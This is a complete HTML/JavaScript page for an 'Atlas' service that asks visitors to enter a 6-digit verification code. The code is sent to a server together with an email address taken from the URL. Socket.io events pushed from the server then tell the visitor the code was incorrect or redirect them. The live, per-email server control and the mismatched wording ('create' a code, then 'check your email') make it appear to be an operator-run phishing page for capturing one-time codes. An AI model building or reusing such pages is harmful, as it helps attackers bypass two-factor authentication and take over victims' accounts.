<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Atlas - Create Code</title>
  <style>
    /* EXACT SAME STYLES AS INDEX.HTML – COPIED */
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .phone {
      width: 390px;
      height: 844px;
      overflow: hidden;
      position: relative;
      background: #fff;
      border-radius: 50px;
      box-shadow: 0 30px 80px rgba(0,0,0,0.22), inset 0 0 0 1px rgba(0,0,0,0.07);
    }
    @media (max-width: 420px) {
      .phone { width: 100%; height: 100vh; border-radius: 0; }
    }
    .gradient-header {
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 52%;
      background: radial-gradient(ellipse 90% 90% at 50% 5%,
        #1e20cc 0%,
        #3a3ef0 20%,
        #6b72f5 42%,
        #b8bcfc 65%,
        #ffffff 100%);
      z-index: 0;
    }
    .header-logo {
      position: absolute;
      top: 48px;
      left: 50%;
      transform: translateX(-50%);
      width: 36px;
      height: 36px;
      object-fit: contain;
      z-index: 5;
    }
    .container {
      position: absolute;
      top: 50%;
      left: 0; right: 0;
      transform: translateY(-50%);
      padding: 0 28px;
      text-align: center;
      z-index: 5;
    }
    h2 {
      font-size: 26px;
      font-weight: 700;
      color: #4a4ff0;
      margin-bottom: 10px;
    }
    .subtext {
      font-size: 14px;
      color: #444;
      line-height: 1.55;
      margin-bottom: 26px;
    }
    .otp-row {
      display: flex;
      gap: 9px;
      justify-content: center;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }
    .otp-box {
      width: 50px;
      height: 55px;
      background: #efefef;
      border: none;
      border-radius: 12px;
      font-size: 22px;
      font-weight: 600;
      text-align: center;
      color: #222;
      outline: none;
    }
    .otp-box:focus { background: #e2e2f0; }
    @media (max-width: 450px) {
      .otp-box { width: 45px; height: 50px; font-size: 20px; }
    }
    @media (max-width: 380px) {
      .otp-box { width: 42px; height: 48px; font-size: 18px; }
      .otp-row { gap: 6px; }
    }
    button {
      width: 100%;
      padding: 17px;
      background: #c5c8fb;
      color: #fff;
      border: none;
      border-radius: 50px;
      font-size: 16px;
      font-weight: 600;
      cursor: default;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    button.active {
      background: #4a4ff0;
      cursor: pointer;
    }
    button:disabled {
      opacity: 0.7;
    }
    .spinner {
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255,255,255,0.3);
      border-top: 2px solid white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .error-msg {
      color: #dc2626;
      font-size: 13px;
      margin-top: 12px;
      text-align: center;
      display: none;
    }
  </style>
</head>
<body>
<div class="phone">
  <div class="gradient-header"></div>
  <img src="logo.png" class="header-logo" alt="logo" />
  <div class="container">
    <h2>Create your code</h2>
    <p class="subtext">Create a 6-digit verification code</p>
    <div class="otp-row">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
    </div>
    <div id="errorMsg" class="error-msg"></div>
    <button id="submitBtn">Submit Code</button>
  </div>
</div>
<script src="/socket.io/socket.io.js"></script>
<script>
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  if (!email) window.location.href = '/';

  const socket = io();
  const boxes = document.querySelectorAll('.otp-box');
  const submitBtn = document.getElementById('submitBtn');
  const errorDiv = document.getElementById('errorMsg');

  function updateButton() {
    const filled = [...boxes].every(b => /^\d$/.test(b.value));
    if (filled) submitBtn.classList.add('active');
    else submitBtn.classList.remove('active');
  }

  function handleInput(e, idx) {
    if (e.target.value.length === 1 && idx < 5) boxes[idx+1].focus();
    updateButton();
    errorDiv.style.display = 'none';
  }

  boxes.forEach((box, idx) => {
    box.addEventListener('input', (e) => handleInput(e, idx));
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) boxes[idx-1].focus();
    });
    box.addEventListener('keypress', (e) => { if (!/[0-9]/.test(e.key)) e.preventDefault(); });
  });

  submitBtn.addEventListener('click', async () => {
    if (!submitBtn.classList.contains('active')) return;
    const otp = [...boxes].map(b => b.value).join('');
    if (otp.length !== 6) return;

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<div class="spinner"></div> Submitting...';

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, otp })
      });
      const data = await res.json();
      if (data.success) {
        submitBtn.innerHTML = 'Code Submitted';
        submitBtn.disabled = true;
      } else {
        alert(data.error || 'Failed to submit OTP');
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Submit Code';
        submitBtn.classList.add('active');
      }
    } catch (err) {
      alert('Network error');
      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Submit Code';
      submitBtn.classList.add('active');
    }
  });

  socket.on('incorrect-otp', (data) => {
    if (data.email === email) {
      errorDiv.textContent = 'Incorrect OTP. Please check your email again.';
      errorDiv.style.display = 'block';
      boxes.forEach(b => b.value = '');
      submitBtn.classList.remove('active');
      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Submit Code';
      boxes[0].focus();
    }
  });

  socket.on('redirect-to-sad', (data) => {
    if (data.email === email) {
      window.location.href = '/success.html';
    }
  });
</script>
</body>
</html>
